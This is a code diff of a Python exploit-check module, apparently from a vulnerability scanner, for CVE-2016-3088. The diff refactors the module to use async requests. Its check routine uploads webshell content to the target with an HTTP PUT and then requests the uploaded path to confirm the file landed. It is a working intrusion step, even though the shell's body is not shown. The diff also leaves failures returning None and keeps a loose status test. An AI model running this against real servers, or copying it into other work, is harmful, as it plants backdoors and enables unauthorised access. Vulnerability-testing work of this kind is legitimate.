@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-import time
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+import asyncio
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2016_3088_BaseVerify:
     def __init__(self, url):
@@ -47,7 +47,7 @@ class CVE_2016_3088_BaseVerify:
         self.webshell_path_list.append(webshell_path_one)
         self.webshell_path_list.append(webshell_path_two)
 
-    def checkfile(self, file_path):
+    async def checkfile(self, file_path):
 
         """
         检查文件路径是否存在
@@ -58,15 +58,11 @@ class CVE_2016_3088_BaseVerify:
         """
 
         try:
-            req = request.get(file_path, headers = self.headers)
-            if req.status_code == 200 or req.status_code != 404:
+            req = await request.get(file_path, headers = self.headers)
+            if req.status == 200 or req.status != 404:
                 return True
-            else:
-                return False
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
     def deal_path(self, install_path):
@@ -94,7 +90,7 @@ class CVE_2016_3088_BaseVerify:
         # print "real_install_path = "+real_install_path
         return real_install_path
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -103,19 +99,16 @@ class CVE_2016_3088_BaseVerify:
 
         :return bool True or False: 是否存在漏洞
         """
-        
+
         try:
             self.put_file_path = self.url + self.put_file_path
-            request.put(self.put_file_path, headers = self.headers, data = self.webshell_content)
-            time.sleep(2)
-            if (self.checkfile(self.put_file_path)):
+            await request.put(self.put_file_path, headers = self.headers, data = self.webshell_content)
+            await asyncio.sleep(2)
+            if (await self.checkfile(self.put_file_path)):
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
